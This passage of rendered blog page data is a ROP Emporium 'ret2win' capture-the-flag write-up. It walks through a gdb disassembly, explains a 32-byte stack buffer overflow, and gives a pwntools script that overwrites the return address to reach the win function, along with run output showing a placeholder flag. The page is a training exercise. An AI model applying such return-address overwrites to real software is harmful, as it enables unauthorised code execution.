operator\",children:\">\"}),\":\tmov    \",(0,e.jsx)(n.span,{className:\"token register variable\",children:\"edi\"}),\",\",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x400918\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x0000000000400729\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"65\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\">\"}),\":\tmov    \",(0,e.jsx)(n.span,{className:\"token register variable\",children:\"eax\"}),\",\",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x0\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x000000000040072e\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"70\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\">\"}),\":\tcall   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x400570\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"<\"}),\"printf@plt\",(0,e.jsx)(n.span,{className:\"token operator\",children:\">\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x0000000000400733\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"75\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\">\"}),\":\tlea    \",(0,e.jsx)(n.span,{className:\"token register variable\",children:\"rax\"}),\",\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"[\"}),(0,e.jsx)(n.span,{className:\"token register variable\",children:\"rbp\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0x20\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"]\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x0000000000400737\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"79\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\">\"}),\":\tmov    \",(0,e.jsx)(n.span,{className:\"token register variable\",children:\"edx\"}),\",\",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x38\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x000000000040073c\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"84\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\">\"}),\":\tmov    \",(0,e.jsx)(n.span,{className:\"token register variable\",children:\"rsi\"}),\",\",(0,e.jsx)(n.span,{className:\"token register variable\",children:\"rax\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x000000000040073f\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"87\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\">\"}),\":\tmov    \",(0,e.jsx)(n.span,{className:\"token register variable\",children:\"edi\"}),\",\",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x0\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x0000000000400744\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"92\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\">\"}),\":\tcall   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x400590\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"<\"}),\"read@plt\",(0,e.jsx)(n.span,{className:\"token operator\",children:\">\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x0000000000400749\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"97\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\">\"}),\":\tmov    \",(0,e.jsx)(n.span,{className:\"token register variable\",children:\"edi\"}),\",\",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x40091b\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x000000000040074e\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"102\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\">\"}),\":\tcall   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x400550\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"<\"}),\"puts@plt\",(0,e.jsx)(n.span,{className:\"token operator\",children:\">\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x0000000000400753\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"107\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\">\"}),`:\tnop\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x0000000000400754\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"108\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\">\"}),`:\tleave\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x0000000000400755\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"<\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"109\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\">\"}),`:\tret\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`End of assembler dump.\n`})]})}),(0,e.jsxs)(n.p,{children:[\"From the disassembled code above, we are filling a buffer of size 0x20(32bytes) with a constant byte of zero. \",(0,e.jsx)(n.strong,{children:\"memset\"}),\" is used to overwrite any values present memory area specified. The memory are we are overwriting is [rbp-0x20]. This means we are allocating a memory buffer of size 32 bytes from the address of base pointer as shown in the stack diagram below.\"]}),(0,e.jsx)(n.div,{children:(0,e.jsx)(c,{alt:\"\",src:\"/static/images/ropemporium/stack.png\",width:\"209\",height:\"256\"})}),(0,e.jsxs)(n.p,{children:[\"Therefore the next function is \",(0,e.jsx)(n.strong,{children:\"read\"}),\" function, which reads from the standard input file descriptor and stores in the specified buffer.From the disassembled code we see we are reading 0x38 bytes from the user input and storing it in our buffer.\"]}),(0,e.jsx)(n.pre,{className:\"language-c\",children:(0,e.jsx)(n.code,{className:\"code-highlight language-c\",children:(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token function\",children:\"read\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"*\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"[\"}),\"rbp\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0x20\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"]\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x38\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"//0 is file descriptor stdin\"}),`\n`]})})}),(0,e.jsxs)(n.p,{children:[\"Because we are reading more than the buffer can hold, we corrupt the adjacent memory regions therefore casusing a stack buffer overflow. Therefore in order to control the return address as shown in the stack image shown above is to fill the buffer, overwrite the rbp register and control the return address with our desired address which is \",(0,e.jsx)(n.strong,{children:\"ret2win\"}),\" function address.\"]}),(0,e.jsxs)(n.h2,{id:\"exploit\",children:[(0,e.jsx)(n.a,{href:\"#exploit\",\"aria-hidden\":\"true\",tabIndex:\"-1\",children:(0,e.jsx)(n.span,{className:\"icon icon-link\"})}),\"Exploit\"]}),(0,e.jsx)(n.p,{children:\"The exploit code for this ret2win function is,\"}),(0,e.jsx)(n.pre,{className:\"language-python\",children:(0,e.jsxs)(n.code,{className:\"code-highlight language-python\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token keyword\",children:\"import\"}),` pwn\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"pwn\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"context\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"encoding \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:'\"latin-1\"'}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"pwn\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"warnings\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"simplefilter\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:'\"ignore\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"pwn\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"context\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"arch \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:'\"amd64\"'}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"io \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" pwn\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"process\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"'./ret2win'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:'b\"A\"'}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"*\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"32\"}),\" \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"# fill the buffer\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:'b\"B\"'}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"*\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"8\"}),\"  \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"#overwrite saved base pointer\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" pwn\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0x400756\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\"  \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"#Address of ret2win function\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"io\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"writeafter\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"'>'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" payload\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"pwn\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"info\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"io\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"clean\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"decode\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]})]})}),(0,e.jsx)(n.p,{children:\"Running the script we get the flag.\"}),(0,e.jsx)(n.pre,{className:\"language-bash\",children:(0,e.jsxs)(n.code,{className:\"code-highlight language-bash\",children:[(0,e.jsx)(n.span,{className:\"code-line\",children:`vx@archie:ret2win$ python3 x.py\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"[\"}),\"+\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"]\"}),\" Starting \",(0,e.jsx)(n.span,{className:\"token builtin class-name\",children:\"local\"}),\" process \",(0,e.jsx)(n.span,{className:\"token string\",children:\"'./ret2win'\"}),(0,e.jsx)(n.span,{className:\"token builtin class-name\",children:\":\"}),\" pid \",(0,e.jsx)(n.span,{className:\"token number\",children:\"45427\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"[\"}),\"*\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"]\"}),\"  Thank you\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"!\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    Well done\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"!\"}),\" Here\",(0,e.jsx)(n.span,{className:\"token string\",children:`'s your flag:\n`})]}),(0,e.jsx)(n.span,{className:\"code-line\",children:(0,e.jsx)(n.span,{className:\"token string\",children:`    ROPE{a_placeholder_32byte_flag!}\n`})}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token string\",children:\"[*] Process '\"}),\"./ret2win' stopped with \",(0,e.jsx)(n.span,{className:\"token builtin class-name\",children:\"exit\"}),\" code \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"pid \",(0,e.jsx)(n.span,{className:\"token number\",children:\"45427\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]})]})})]})}}var v=f;function w(a,s){throw new Error(\"Expected \"+(s?\"component\":\"object\")+\" `\"+a+\"` to be defined: you likely forgot to import, pass, or provide it.\")}return y;})();\n;return Component;","toc":[{"value":"Introduction","url":"#introduction","depth":1},{"value":"Exploit","url":"#exploit","depth":2}],"frontMatter":{"readingTime":{"text":"7 min read","minutes":6.735,"time":404100,"words":1347},"slug":"ropemporium-ret2win","fileName":"ropemporium-ret2win.mdx","title":"Return-Oriented Programming - ret2win","date":"2021-12-20","tags":["ropemporium","rop","pwn"],"draft":false,"summary":"ret2win means return here to win and it's recommended you start with this challenge. Visit the challenge page by clicking this card to learn more.","images":"/static/images/ropemporium/ret2win.jpg","layout":"PostLayout"}},"authorDetails":[{"readingTime":{"text":"1 min read","minutes":0.535,"time":32100,"words":107},"slug":["default"],"fileName":"default.md","name":"Thuri","avatar":"/static/images/profile.png","occupation":"Software Developer","email":"thuri783@gmail.com","github":"https://github.com/thuri10"}],"prev":{"title":"Return-Oriented Programming - Split","date":"2021-12-20T00:00:00.000Z","tags":["ropemporium","rop","pwn"],"draft":false,"summary":"Combine elements from the ret2win challenge that have been split apart to beat this challenge. Learn how to use another tool whilst crafting a short ROP chain.","layout":"PostLayout","images":"/static/images/ropemporium/split.jpg","canonicalUrl":null,"slug":"ropemporium-split"},"next":{"title":"Return-Oriented Programming - Ret2csu","date":"2021-12-20T00:00:00.000Z","tags":["ropemporium","rop","pwn"],"draft":false,"summary":"Learn a ROP technique that lets you populate useful calling convention registers like rdi, rsi and rdx even in an environment where gadgets are sparse.","images":"/static/images/ropemporium/retcsu.jpg","layout":"PostLayout","canonicalUrl":null,"slug":"ropemporium-ret2csu"}},"__N_SSG":true}